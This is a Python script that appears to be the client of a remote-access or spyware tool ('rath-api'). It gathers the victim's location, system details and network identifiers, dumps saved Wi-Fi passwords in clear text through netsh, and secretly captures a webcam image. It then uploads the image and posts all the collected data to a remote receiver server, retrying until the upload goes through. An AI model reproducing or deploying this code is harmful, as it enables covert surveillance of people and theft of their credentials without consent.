import requests
import time
import os
import platform
import subprocess
import socket
import json
from cv2 import VideoCapture, imwrite
from requests import get
from datetime import datetime

main_url = 'https://skakmat.ip-dynamic.com'
receive_url = 'http://192.168.100.14/rath-api/receiver.php'
upload_url = 'http://192.168.100.14/rath-api/upload.php'
sent = False
ident = 1

def updatePayload():
    msg = {
            'id': ident,
            'time': str(datetime.now().strftime('%H:%M:%S %d-%b-%Y')),
            'location': {
                'lat': getLocation()[0],
                'long': getLocation()[1].replace(' ', '').replace('\n', ''),
            },
            'os': getOs(),
            'name': getDesktopName(),
            'wifi': {
                'current_ssid': getActiveSSID(),
                'current_password': '',
                'current_mac': getActiveMAC(),
                'current_local_ip': getLocalIP(),
                'current_public_ip': getPublicIP(),
                'current_adapter': getAdapter(),
                'nearby': {},
                'saved': getSavedWifi(),
            },
            'processes': [],
            'installed_apps': [],
            'snapshot_url': captureWebcam()
        }

    payload = {
        'type': 'alert',
        'id': ident,
        'message': json.dumps(msg)
    }

    test = json.dumps(msg)

    with open('json.txt', 'w') as f:
        f.write(test)

    return payload


def captureWebcam():
    try:
        cam = VideoCapture(0)
        s, img = cam.read()

        if s:
            filetime = str(int(time.time()))
            filename = 'D:\\Sync\\OneDrive - Los Angeles Community College District\\OneNote\\Misc\\snapshots\\' + filetime + '.png'
            imwrite(filename, img)
            with open(filename, 'rb') as f:
                try:
                    r = requests.post(upload_url,
                        files={'fileToUpload': (filetime + '.png', f)})
                    print(r.text)

                    snapshot_url = main_url + '/rath-api/res/' + filetime + '.png'
                    return snapshot_url

                except Exception as e:
                    print('File upload error:', e)
    except Exception as e:
        print('Camera error:', e)


def getLocation():
    try:
        r = requests.get('https://ipinfo.io/loc')
        return r.text.split(',')
    except Exception as e:
        print('Location error:', e)
    pass

def getOs():
    try:
        p = str(platform.platform())
        p += ' | ' + str(platform.system()) + ' ' + str(platform.release()) + ' | ' + str(platform.version())
        return p
    except Exception as e:
        print('Error on getting platform os:', e)

def getDesktopName():
    try:
        p = os.getenv('COMPUTERNAME')
        return p
    except Exception as e:
        print('Error on getting platform name:', e)

def getSavedWifi():
    output = {}
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    ssid = i[:35]
                    pw = results[0]
                    output[ssid] = pw
                except IndexError:
                    ssid = i[:35]
                    output[ssid] = 'NONE'
            except subprocess.CalledProcessError:
                print("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
    except Exception as e:
        print('Error on getting saved wifi:', e)
    return output

def getActiveSSID():
    output = ''
    try:
        data = str(subprocess.check_output("netsh wlan show interfaces"))
        output = data.split('SSID')[1]
        output = output.split(':')[1]
        output = output.split('\\r')[0]
    except Exception as e:
        print('Error on getting active wifi:', e)
    return output

def getActiveMAC():
    output = 'BSSID: '
    try:
        data = str(subprocess.check_output("netsh wlan show interfaces"))
        o = data.split('BSSID')[1].replace(' ', '')
        o = o.split(':')[0:]
        o = str(o).split('\\')[0].replace('\'', '').replace(', ',':').replace('[:', '')
        output += str(o)
    except Exception as e:
        print('Error on getting active mac:', e)
    try:
        data = str(subprocess.check_output("netsh wlan show interfaces"))
        o = data.split('Physical address')[1]
        o = o.split(':')[1:]
        o = str(o).split('\\')[0].replace('\'', '').replace(', ',':').replace('[', '')
        output += ' | PA:' + o
    except Exception as e:
        print('Error on getting active mac:', e)
    return output

def getAdapter():
    try:
        data = str(subprocess.check_output("netsh wlan show interfaces"))
        o = data.split('Description')[1].replace('  ', ' ')
        o = o.split(':')[1:]
        o = str(o).split('\\')[0].replace('\'', '').replace(', ',':').replace('[', '')
        return o
    except Exception as e:
        print('Error on getting active mac:', e)

def getLocalIP():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        return ip
    except Exception as e:
        print('Error when getting local IP:', e)

def getPublicIP():
    try:
        ip = get('https://api.ipify.org').text
        return ip
    except Exception as e:
        print('Error when getting public IP:', e)

def notify():
    global sent
    while not sent:
        try:
            r = requests.post(receive_url, data=updatePayload())
            print(r.text)
            sent = True
        except Exception as e:
            print(e)
            time.sleep(30)